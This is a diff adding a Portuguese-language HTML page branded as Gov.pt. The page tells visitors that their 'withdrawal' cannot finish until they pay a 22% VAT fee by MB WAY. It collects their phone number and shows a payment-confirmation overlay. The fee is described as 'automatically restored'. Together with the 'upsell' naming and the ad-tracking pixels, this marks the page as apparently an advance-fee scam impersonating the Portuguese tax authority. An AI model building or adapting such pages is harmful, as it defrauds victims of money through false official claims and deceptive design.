@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Finalizar Levantamento</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+    
+    <!-- Tracking Scripts: UTMIFY & Meta Pixel -->
+    <script 
+       src="https://cdn.utmify.com.br/scripts/utms/latest.js" 
+       data-utmify-prevent-xcod-sck 
+       data-utmify-prevent-subids 
+       async 
+       defer 
+     ></script> 
+     
+     <script> 
+       window.pixelId = "69594f24ad5d52730c130a4e"; 
+       var a = document.createElement("script"); 
+       a.setAttribute("async", ""); 
+       a.setAttribute("defer", ""); 
+       a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js"); 
+       document.head.appendChild(a); 
+     </script> 
+     
+     <!-- Meta Pixel Code --> 
+     <script> 
+     !function(f,b,e,v,n,t,s) 
+     {if(f.fbq)return;n=f.fbq=function(){n.callMethod? 
+     n.callMethod.apply(n,arguments):n.queue.push(arguments)}; 
+     if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0'; 
+     n.queue=[];t=b.createElement(e);t.async=!0; 
+     t.src=v;s=b.getElementsByTagName(e)[0]; 
+     s.parentNode.insertBefore(t,s)}(window, document,'script', 
+     'https://connect.facebook.net/en_US/fbevents.js'); 
+     fbq('init', '2057846451722850'); 
+     fbq('init', '920534473682926'); 
+     fbq('track', 'PageView'); 
+     </script> 
+     <noscript>
+     <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2057846451722850&ev=PageView&noscript=1"/>
+     <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=920534473682926&ev=PageView&noscript=1"/>
+     </noscript> 
+     <!-- End Meta Pixel Code -->
+
+    <style>
+        /* Styles for the loading overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            z-index: 2000;
+            display: none; /* Hidden by default */
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--gov-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-title {
+            color: var(--gov-blue);
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .loading-text {
+            color: var(--gov-text);
+            font-size: 1rem;
+            max-width: 400px;
+            line-height: 1.5;
+        }
+
+        :root {
+            --gov-blue: #0059b3;
+            --gov-blue-dark: #004080;
+            --gov-bg: #f8f9fa;
+            --gov-text: #212529;
+        }
+        body {
+            background-color: var(--gov-bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            font-family: 'Open Sans', sans-serif;
+            padding-top: 140px; /* Adjusted for fixed header container */
+        }
+        .fixed-header-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        .top-warning {
+            background: #fff3cd;
+            border-bottom: 1px solid #ffeeba;
+            color: #856404;
+            text-align: center;
+            padding: 12px 16px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .brand-header {
+            background-color: #fff;
+            border-bottom: 1px solid #ddd;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .brand-logo {
+            height: 40px;
+        }
+        .upsell-card {
+            background: #fff;
+            max-width: 480px;
+            width: 100%;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            /* box-shadow removed as per flat design, or keep subtle */
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            padding: 30px;
+            position: relative;
+            margin-top: 12px;
+        }
+        .upsell-header {
+            margin-bottom: 20px;
+            border-bottom: 1px solid #f0f0f0;
+            padding-bottom: 15px;
+        }
+        .upsell-header h3 {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: var(--gov-blue);
+            margin: 0;
+        }
+        .upsell-body p {
+            font-size: 0.95rem;
+            color: var(--gov-text);
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+        .highlight-box {
+            background: #e9ecef;
+            border-left: 4px solid var(--gov-blue);
+            padding: 15px;
+            border-radius: 2px;
+            margin-bottom: 20px;
+        }
+        .payment-option {
+            border: 1px solid #ced4da;
+            background: #fff;
+            border-radius: 4px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            color: var(--gov-text);
+        }
+        .phone-input-group {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ced4da;
+            border-radius: 4px;
+            padding: 5px 15px;
+            margin-bottom: 25px;
+            background: #fff;
+        }
+        .phone-prefix {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding-right: 15px;
+            border-right: 1px solid #eee;
+            font-weight: 600;
+            color: #333;
+        }
+        .phone-input-group input {
+            border: none;
+            outline: none;
+            padding: 10px;
+            width: 100%;
+            font-size: 1rem;
+            color: #333;
+        }
+        .footer-note {
+            font-size: 0.75rem;
+            color: #6c757d;
+            margin-top: 15px;
+            text-align: center;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
+        .btn-ajudar {
+            background-color: var(--gov-blue);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-size: 1rem;
+        }
+        .btn-ajudar:hover {
+            background-color: var(--gov-blue-dark);
+        }
+        .upsell-card > * { margin-bottom: 16px; }
+        .upsell-body > * { margin-bottom: 16px; }
+    </style>
+</head>
+<body>
+    <div class="fixed-header-container">
+        <div class="top-warning">Atenção: o seu levantamento ainda não foi concluído. Para finalizar, é necessário pagar a taxa de IVA abaixo.</div>
+        
+        <div class="brand-header">
+            <img src="images/logo_Portugal.svg" alt="Gov.pt" class="brand-logo">
+        </div>
+    </div>
+
+    <div class="upsell-card">
+        
+        <div class="upsell-header">
+            <h3>IVA — Imposto sobre o Valor Acrescentado</h3>
+        </div>
+
+        <div class="upsell-body">
+            <p>De acordo com a <strong>legislação fiscal em vigor em Portugal</strong>, é obrigatória a aplicação do <strong>IVA (Imposto sobre o Valor Acrescentado)</strong> em determinadas operações financeiras, incluindo processos de levantamento.</p>
+            
+            <div class="highlight-box">
+                <p style="margin-bottom: 10px;">Para esta operação, será aplicada uma <strong>taxa de 22% (<span id="tax-amount-display" style="color:var(--gov-blue); font-weight:bold;">€ 17,38</span>)</strong> sobre o <strong>valor solicitado para levantamento</strong>, correspondente à taxa normal de IVA atualmente em vigor no país.</p>
+                <p style="margin:0; font-size: 0.85rem;">Após a <strong>confirmação do pagamento</strong>, o valor do IVA será <strong>automaticamente restabelecido</strong> e integrado na própria <span style="color:var(--gov-blue); text-decoration:underline;">transação de levantamento</span>, garantindo que não há qualquer prejuízo final ao utilizador.</p>
+            </div>
+
+            <div class="payment-option">
+                <input type="checkbox" checked="" disabled="" style="accent-color: var(--gov-blue);">
+                <img src="images/mbway.svg" alt="MB WAY" height="20">
+                <span>Mbway</span>
+            </div>
+
+            <div class="phone-input-group" style="position:relative;">
+                <input type="tel" id="upsell-phone" placeholder="Insira seu número de telemóvel" maxlength="15" value="+351 " style="padding-right: 40px;">
+                <span style="position:absolute; right:10px; font-size: 1.2rem;">🇵🇹</span>
+            </div>
+
+            <button id="btn-retirar" class="btn-ajudar" style="margin-top: 0;">PAGAR TAXA E CONCLUIR</button>
+            
+            <div class="footer-note">
+                Fonte de referência: <span style="color: #6c757d; text-decoration: underline;">Portal de Finanças Gov.pt — IVA</span>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/config.js"></script> <!-- Configurações de API -->
+    <script src="js/upsell.js"></script>
+
+    <!-- Loading Overlay -->
+    <div id="loading-overlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <div class="loading-title">A aguardar confirmação...</div>
+        <div class="loading-text">Por favor, aceda à aplicação MB WAY no seu telemóvel e autorize o pagamento da taxa de IVA.<br><br>Não feche esta página enquanto aguarda.</div>
+        <button id="btn-confirmar-pagamento" onclick="window.location.href='obrigado.html'" style="display:none; margin-top:24px; background-color:#0059b3; color:white; border:none; padding:14px 32px; border-radius:4px; font-weight:600; font-size:1rem; cursor:pointer;">JÁ CONFIRMEI O PAGAMENTO</button>
+    </div>
+</body>
+</html>
